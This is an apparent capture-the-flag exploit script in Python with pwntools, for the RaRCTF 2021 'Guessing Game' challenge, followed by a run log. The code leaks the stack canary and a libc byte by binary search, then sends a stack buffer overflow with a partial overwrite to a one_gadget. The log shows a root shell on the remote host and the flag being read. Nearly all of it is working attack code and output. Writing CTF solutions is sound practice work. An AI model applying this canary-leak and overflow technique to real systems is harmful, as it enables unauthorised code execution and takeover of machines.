from pwn import *

#context(os='linux', arch='amd64')
#context.log_level = 'debug'

BINARY = './guess'
elf  = ELF(BINARY)

def Guess_byte(s, pos):
  p0 = 0x80
  p1 = 0x80
  while True:
    s.sendlineafter("Which number are you guessing (0-7)? ", str(pos))
    s.sendlineafter("Enter your guess: ", str(p0))
    r = s.recvuntil("\n")[:-1]
    #print("r =", r)
    if r == b"You got it!":
      break
    elif r == b"Too high!":
      p0 = p0-(p1>>1)
      p1 = p1>>1
    else:
      p0 = p0+(p1>>1)
      p1 = p1>>1
    #print("p0 =", hex(p0), "p1 =", hex(p1))  
      
  return(p0)

for i in range(256):
 print("i =", i)
 if len(sys.argv) > 1 and sys.argv[1] == 'r':
  HOST = "193.57.159.27"
  PORT = 59721
  s = remote(HOST, PORT)
 else:
  s = process(BINARY)

 canary = 0
 for i in range(7):
  r = Guess_byte(s, 39 - i)
  print("i=", i, ", r =", hex(r))
  canary = (canary<<8) + r
 canary = (canary<<8)
 print("canary =", hex(canary))

 libc_3byte = Guess_byte(s, 50)
 one_gadget_3byte = (libc_3byte - 0xde + 0xdb + 0xe + 1)%256

 print("libc_3byte =", hex(libc_3byte))
 print("one_gadget_3byte =", hex(one_gadget_3byte))

 s.recvuntil("So, what did you think of my game? ")
 buf  = b"A"*0x18
 buf += p64(canary)
 buf += p64(0)
 #buf += b"\xf1\x5a" + bytes([one_gadget_3byte])
 buf += b"\x81\x6c" + bytes([one_gadget_3byte])
 #pause()
 s.send(buf)

 s.sendline("id")
 try:
  r = s.recvuntil("\n")
  print(r) 
  s.interactive()
 except:
  s.close()

'''
mito@ubuntu:~/CTF/RaRCTF_2021/Pwn_The_Guessing_Game_300$ python3 solve.py  r
[*] '/home/mito/CTF/RaRCTF_2021/Pwn_The_Guessing_Game_300/guess'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
i = 4
[+] Opening connection to 193.57.159.27 on port 59721: Done
i= 0 , r = 0xff
i= 1 , r = 0x2d
i= 2 , r = 0x4a
i= 3 , r = 0x5a
i= 4 , r = 0x4d
i= 5 , r = 0xb7
i= 6 , r = 0x85
canary = 0xff2d4a5a4db78500
libc_3byte = 0x2
one_gadget_3byte = 0xe
b'uid=0(root) gid=0(root) groups=0(root)\n'
[*] Switching to interactive mode
$ id
uid=0(root) gid=0(root) groups=0(root)
$ cat flag.txt
rarctf{4nd_th3y_s41d_gu3ss1ng_1snt_fun!!_c9cbd665}
'''

